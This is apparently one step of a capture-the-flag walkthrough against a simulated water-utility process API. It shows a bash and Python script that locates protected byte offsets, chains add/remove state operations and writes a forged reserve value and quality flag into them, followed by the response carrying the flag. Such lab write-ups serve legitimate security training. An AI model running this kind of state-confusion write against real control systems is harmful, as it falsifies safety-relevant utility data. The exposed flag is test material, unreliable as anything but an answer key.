## Write the protected reserve and quality fields

Locate the reserve and quality offsets in the replacement snapshot, then rebuild
the district state and write the reported reserve (`13.4`) and quality (`1`) into
their protected offsets. Adding an extra out-of-contract write (offset 8) is
rejected with 409.

```bash
PROCESS=$(cat receipts/process-session)
PV=https://process-view.arwc.test
BODY=$(python3 - <<'PY'
import json, struct
district = "Cairn Reach"; reported_ml = 13.4; instrument_b = "FIT-CRR-204B"
ordinary = {k: (v if k == "quality" else float(v))
            for k, v in (f.split("=", 1) for f in open("/tmp/w23ord.txt").read().split()[1:])}
fields = dict(l.split("=", 1) for l in open("/tmp/w23rep.txt").read().splitlines() if "=" in l)
replacement = bytes.fromhex(fields["replacement"])
ordinary_key = next(k for k in ordinary if district.startswith(str(k)))
reserve_bytes = struct.pack("<d", float(ordinary[ordinary_key]))
quality_bytes = struct.pack("<I", 1)
reserve_offset = replacement.find(reserve_bytes)
quality_offset = replacement.find(quality_bytes)
quality = struct.unpack_from("<I", replacement, quality_offset)[0]
control = {"estimator": "EST-CRR-23", "operations": [
    {"op": "remove-duplicate", "source_id": instrument_b},
    {"op": "add-state", "district_id": district},
    {"op": "remove-state", "district_id": district},
    {"op": "add-state", "district_id": district},
    {"op": "write-stale", "offset": reserve_offset, "f64": reported_ml},
    {"op": "write-stale", "offset": quality_offset, "u32": quality},
]}
print(json.dumps(control))
PY
)
curl -sk --cacert /tmp/arwc-ca.crt -H "Authorization: Bearer $PROCESS" -H "X-ARWC-Tenant: arwc" \
  -H "Content-Type: application/json" -d "$BODY" -X POST "$PV/api/control-commands/consequence"
```

```json
{"audit_id":"...","flag":"FLAG{4260f7f8a6d56159}","record":{"writable_offsets":[40,48],"district_id":"Cairn Reach",...}}
```

On this scenario `writable_offsets` is `[40, 48]` (reserve then quality). The flag
is in the top-level `flag` field.
